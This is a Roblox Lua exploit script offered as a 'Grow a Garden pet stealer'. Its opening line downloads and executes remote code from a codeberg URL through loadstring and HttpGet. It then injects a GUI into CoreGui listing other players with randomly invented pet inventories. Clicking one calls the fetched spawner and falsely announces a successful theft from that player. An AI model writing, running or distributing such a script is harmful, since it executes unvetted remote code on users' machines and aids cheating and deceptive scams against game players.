-- Fixed Grow a Garden Pet Stealer UI with Working Toggle, Spawner, and Message
local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()

local allPets = {
    "Kitsune", "Raccoon", "Corrupted Kitsune",
    "Dragonfly", "T-Rex", "Disco Bee", "Butterfly"
}

local petDisplayNames = {
    ["Kitsune"] = "Kitsune",
    ["Raccoon"] = "Raccoon",
    ["Corrupted Kitsune"] = "Corrupted Kitsune",
    ["Dragonfly"] = "Dragonfly",
    ["T-Rex"] = "T-Rex",
    ["Disco Bee"] = "Disco Bee",
    ["Butterfly"] = "Butterfly"
}

-- GUI Setup
local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
gui.Name = "GrowAGardenStealer"
gui.ResetOnSpawn = false

-- Main Frame
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0.6, 0, 0.6, 0)
frame.Position = UDim2.new(0.2, 0, 0.2, 0)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

-- Sidebar
local sidebar = Instance.new("Frame", frame)
sidebar.Size = UDim2.new(0.3, 0, 1, 0)
sidebar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
local playerListLayout = Instance.new("UIListLayout", sidebar)
playerListLayout.Padding = UDim.new(0, 4)
playerListLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Right panel
local rightPanel = Instance.new("Frame", frame)
rightPanel.Position = UDim2.new(0.3, 0, 0, 0)
rightPanel.Size = UDim2.new(0.7, 0, 1, 0)
rightPanel.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
local petListLayout = Instance.new("UIListLayout", rightPanel)
petListLayout.Padding = UDim.new(0, 5)
petListLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Message Label
local msg = Instance.new("TextLabel", frame)
msg.Size = UDim2.new(1, 0, 0.08, 0)
msg.Position = UDim2.new(0, 0, -0.08, 0)
msg.BackgroundTransparency = 1
msg.TextColor3 = Color3.fromRGB(255, 255, 255)
msg.TextScaled = true
msg.Text = ""
msg.Visible = false

local function showMessage(text)
    msg.Text = text
    msg.Visible = true
    msg.TextTransparency = 1
    msg:TweenTransparency(0, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
    task.delay(1.5, function()
        msg:TweenTransparency(1, Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.4, true)
        task.wait(0.4)
        msg.Visible = false
    end)
end

-- Random pet generator
local function generatePetSet()
    local result, pool = {}, {}
    for _, pet in ipairs(allPets) do table.insert(pool, pet) end
    for _ = 1, math.random(3, 5) do
        if #pool == 0 then break end
        local i = math.random(1, #pool)
        result[pool[i]] = math.random(1, 2)
        table.remove(pool, i)
    end
    return result
end

local currentPets = {}
local currentButton = nil

local function loadPetButtons(plrName)
    rightPanel:ClearAllChildren()
    for pet, count in pairs(currentPets[plrName]) do
        local btn = Instance.new("TextButton", rightPanel)
        btn.Size = UDim2.new(1, -10, 0, 40)
        btn.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.TextScaled = true
        btn.Text = petDisplayNames[pet] .. " (" .. count .. ")"
        btn.AutoButtonColor = true

        btn.MouseButton1Click:Connect(function()
            if currentPets[plrName][pet] <= 0 then return end
            local success = pcall(function()
                Spawner.SpawnPet(pet, math.random(1, 3), math.random(1, 3))
            end)
            if success then
                currentPets[plrName][pet] -= 1
                btn.Text = petDisplayNames[pet] .. " (" .. currentPets[plrName][pet] .. ")"
                showMessage("Successfully stole " .. petDisplayNames[pet] .. " from " .. plrName)
                if currentPets[plrName][pet] <= 0 then
                    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                    btn.AutoButtonColor = false
                end
            end
        end)
    end
end

local function refreshPlayerList()
    sidebar:ClearAllChildren()
    currentPets = {}
    for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
        local btn = Instance.new("TextButton", sidebar)
        btn.Size = UDim2.new(1, -10, 0, 35)
        btn.BackgroundColor3 = Color3.fromRGB(70, 70, 100)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.TextScaled = true
        btn.Text = plr.Name

        currentPets[plr.Name] = generatePetSet()

        btn.MouseButton1Click:Connect(function()
            if currentButton then currentButton.BackgroundColor3 = Color3.fromRGB(70, 70, 100) end
            currentButton = btn
            btn.BackgroundColor3 = Color3.fromRGB(120, 80, 150)
            loadPetButtons(plr.Name)
        end)
    end
end

-- Toggle key
local UIS = game:GetService("UserInputService")
local visible = true
UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        visible = not visible
        gui.Enabled = visible
    end
end)

refreshPlayerList()
